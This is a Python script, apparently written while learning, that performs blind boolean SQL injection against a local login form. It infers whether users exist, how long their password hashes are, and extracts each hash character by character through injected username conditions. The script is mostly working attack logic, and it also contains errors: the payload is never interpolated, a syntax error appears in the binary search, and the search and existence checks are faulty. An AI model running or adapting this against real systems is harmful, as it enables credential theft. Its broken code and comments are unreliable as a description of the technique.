import requests

total_queries = 0
charset = "0123456789abcdef" # All hex characters (used in password hash guessing)

target = "127.0.0.1:5000"
success_message = "Welcome back"


#Below function sends a POST request with SQL injection in the username
def injected_query(payload):
	global total_queries
	#Below we send a post request by injecting condition into SQL and comment out rest
	response = requests.post(target, data = {f"username" : "admin' and {payload}--", "password" : "password"}) #Dummy password (ignored due to SQL comment)
	total_queries+=1 #Count total queries made
	#Return True if SQL condition is TRUE (we detect this via a failed login response). Because we aren’t trying to log in — we’re just checking if the SQL condition was true
	return success_message.encode() not in response.content 

#Below function checks if a specific character in the user's password is greater than, equal to, or less than a given character
def boolean_query(offset, user_id, character, operator=">"): #offset is the position of the character
	payload = f"select hex(substr(password,{offset+1},1)) from user where id = {user_id} {operator} hex('{character}')"
	return injected_query(payload)
#offset + 1 - Adjusts for SQL being 1-indexed
#substr(password, X, 1) - Gets one character from password at position X
#hex(...) - Converts character to hex for comparison
#{operator} - Can be >, <, = to test character match
#Whole query: “Is password character at this position greater/less than/equal to this single character from the charset?”
#We compare each character of the password hash one-by-one against these possible characters


#Let's check if a user with that user_id exists in the database
#The SQL payload will be TRUE if the user exists (because their id is a number ≥ 0).
def invalid_user(user_id):
	payload = f"(select id from user where id = {user_id}) >= 0"
	return injected_query(payload)


#Guessing the length of the password
def password_length(user_id):
	i = 0 #Starts with i = 0, then 1, 2, 3, and so on. When i becomes equal to or greater than the actual password length, the condition is true.
	while True:
		payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
		if not injected_query(payload):
			return i
		i+=1


#Extract the password hash character by character
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]): #Check if the password character at position i is greater than, equal to, or less than the current charset[j] character
				found += charset[j]
				break
	return found
	
#Extract the password hash using binary search
def extract_hash_bst(charset, user_id, password_length):
	found = "" #This will store the extracted password hash
	
	#Loop through each character position in the password hash
	for index in range(0, password_length):
		start = 0 #Start of the charset
		end = len(charset) - 1 #End of the charset

		#Perform binary search to find the correct character at the current position
		while start <= end:
			#If the search space is reduced to two characters
			if end - start == 1:
				#If the first character in the range matches, add it to the found password
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found += charset[start]
				else:
					found += charset[start + 1] #Otherwise, add the second character
				break
			else:
				#Find the middle character in the search range
				middle = (start + end) // 2
				#Perform the boolean query to check if the middle character matches the password
				if boolean_query(index, user_id, charset[middle])
					end = middle #If the middle character matches, narrow the search to the lower half
				else:
					start = middle #If the middle character doesn't match, narrow the search to the upper half
	return found #Return the extracted password hash

def total_queries_taken():
	global total_queries
	print(f"\t\t[!] {total_queries} total queries!") #prints the number of total queries made so far
	total_queries = 0 #After printing, it resets the total_queries counter to 0, so it can start counting again


while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id): #checks if the user exists by sending an SQL query
			user_password_length = password_length(user_id) #If the user exists, it then calls password_length(user_id) to find out how long the user's password hash is and stores in user_password_length
			print(f"\t[-] User {user_id} hash length: {user_password_length}") #print out the length of the password hash for the given user
			total_queries_taken() #print the number of queries made so far, and then resets the count
			print(f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}") 
			#Above line calls the extract_hash() function, passing in:
			#charset: The set of possible characters ("0123456789abcdef").
			#user_id: The user ID for which the password hash is being extracted.
			#user_password_length: The length of the password hash.
			#This prints the extracted password hash for that user.
			total_queries_taken() #again, print the number of queries and reset the count.
			print(f"\t[-] User {user_id} hash: {extract_hash_bst(charset, int(user_id), user_password_length)}") 
			total_queries_taken()
		else:
			print(f"\t[X] User {user_id} does not exist!") #If invalid_user(user_id) returns true (meaning the user doesn't exist), it prints a message indicating that the user doesn't exist.
	except KeyboardInterrupt:
		break

# What this code does overall:

# 1.Prompts the user for a user_id.
# 2.Checks if the user exists in the database.
# 3.If the user exists:

	# Finds the length of their password hash.
	# Extracts the password hash.
	# Prints the length and the hash.

# 4.If the user does not exist, it prints an error message.
# 5.This repeats until the program is manually stopped (via Ctrl+C).
